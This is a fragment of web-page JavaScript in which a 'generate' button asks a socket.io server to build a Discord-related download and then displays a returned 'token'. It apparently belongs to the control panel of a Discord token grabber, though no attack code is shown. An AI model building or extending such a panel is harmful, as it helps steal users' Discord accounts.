        <script>
            socket.on("connect", () => {
                $("#id").html(socket.id);
            });

            function generate() {
                socket.emit("discord", "generate");

                $("#generate").attr("disabled", true);
                $("#loadingCircle").addClass("spinner-border spinner-border-sm text-light");
            }

            socket.on("discord-link", (link) => {
                $("#generate").val("Download started!")
                $("#loadingCircle").removeClass("spinner-border spinner-border-sm text-light");

                window.open(link.link);
            });

            socket.on("discord-response", (res) => {
                $("#token").html(res.res.content["Discord"]);
                $("#tokenparent").show();
